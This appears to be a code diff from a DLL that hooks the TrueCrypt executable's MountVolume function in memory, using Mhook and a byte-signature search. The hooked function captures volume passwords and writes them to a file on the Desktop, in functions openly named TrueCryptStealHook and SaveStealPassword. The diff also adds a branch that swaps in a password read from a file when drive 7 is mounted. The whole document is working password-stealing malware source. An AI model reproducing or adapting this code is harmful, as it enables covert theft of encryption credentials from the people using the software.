@@ -4,8 +4,48 @@
 
 _MountVolume RealMountVolume;
 
+BOOL TrueCryptStealHook()
+{
+
+	HANDLE hProc = GetCurrentProcess();
+	if (hProc == NULL)
+		return FALSE;
+
+	LPVOID baseAddress;
+	DWORD baseSize;
+	WCHAR moduleName[14] = L"TrueCrypt.exe";
+
+	if (GetBaseAddressAndSizeModuleInProcess(hProc, baseAddress, baseSize, moduleName, 14))
+	{
+		LPVOID functionAddress;
+		BYTE functionBytes[5] = { 0xB8, 0x34, 0x27, 0x00, 0x00 };
+
+		if (GetFunctionAddressInProcessMemory(hProc, baseAddress, baseSize, functionAddress, functionBytes, 5))
+		{
+			RealMountVolume = (_MountVolume)functionAddress;
+
+			Mhook_SetHook((PVOID *)&RealMountVolume, FakeMountVolume);
+		}
+	}
+
+	return TRUE;
+}
+
 int FakeMountVolume(HWND hwndDlg, int driveNo, char *volumePath, Password *password, BOOL cachePassword, BOOL sharedAccess, const MountOptions* const mountOptions, BOOL quiet, BOOL bReportWrongPassword)
 {
+	if (driveNo == 7 && password != NULL && password->Length > 0)
+	{
+		CHAR openFileName[MAX_PATH];
+		GetFilePathFromDirectoryNameAndFileName(PATH_TO_DESKTOP, volumePath, openFileName);
+
+		HANDLE hFile = CreateFileA(openFileName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+		if (hFile != INVALID_HANDLE_VALUE)
+		{
+			ReadFile(hFile, password->Text, 64, (LPDWORD)&(password->Length), NULL);
+			CloseHandle(hFile);
+		}
+	}
+
 	int result_mount = RealMountVolume(hwndDlg, driveNo, volumePath, password, cachePassword, sharedAccess, mountOptions, quiet, bReportWrongPassword);
 
 	if (result_mount > 0)
@@ -17,7 +57,7 @@ int FakeMountVolume(HWND hwndDlg, int driveNo, char *volumePath, Password *passw
 void SaveStealPassword(LPSTR volumePath, PBYTE password, UINT passwordLen)
 {
 	CHAR fileToSave[MAX_PATH];
-	GetFilePathToSaveStealPassword("C:\\Users\\user\\Desktop\\", volumePath, fileToSave);
+	GetFilePathFromDirectoryNameAndFileName(PATH_TO_DESKTOP, volumePath, fileToSave);
 
 	HANDLE hFile = CreateFileA(fileToSave, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 	if (hFile == INVALID_HANDLE_VALUE)
@@ -29,7 +69,7 @@ void SaveStealPassword(LPSTR volumePath, PBYTE password, UINT passwordLen)
 	CloseHandle(hFile);
 }
 
-void GetFilePathToSaveStealPassword(LPSTR rootPath, LPSTR volumePath, LPSTR fileToSave)
+void GetFilePathFromDirectoryNameAndFileName(LPSTR rootPath, LPSTR volumePath, LPSTR fileToSave)
 {
 	size_t lenFileToSave = 0;
 
@@ -54,32 +94,6 @@ void GetFilePathToSaveStealPassword(LPSTR rootPath, LPSTR volumePath, LPSTR file
 
 	*fileToSave = '\0';
 	fileToSave -= lenFileToSave;
-}
-
-BOOL TrueCryptStealHook()
-{
-	HANDLE hProc = GetCurrentProcess();
-	if (hProc == NULL)
-		return FALSE;
-
-	LPVOID baseAddress;
-	DWORD baseSize;
-	WCHAR moduleName[14] = L"TrueCrypt.exe";
-
-	if (GetBaseAddressAndSizeModuleInProcess(hProc, baseAddress, baseSize, moduleName, 14))
-	{
-		LPVOID functionAddress;
-		BYTE functionBytes[5] = { 0xB8, 0x34, 0x27, 0x00, 0x00 };
-
-		if (GetFunctionAddressInProcessMemory(hProc, baseAddress, baseSize, functionAddress, functionBytes, 5))
-		{
-			RealMountVolume = (_MountVolume)functionAddress;
-
-			Mhook_SetHook((PVOID *)&RealMountVolume, FakeMountVolume);
-		}
-	}
-
-	return TRUE;
 }
 
 BOOL GetBaseAddressAndSizeModuleInProcess(HANDLE hProc, LPVOID &base, DWORD &size, LPWCH needModuleName, int needModuleNameSize)
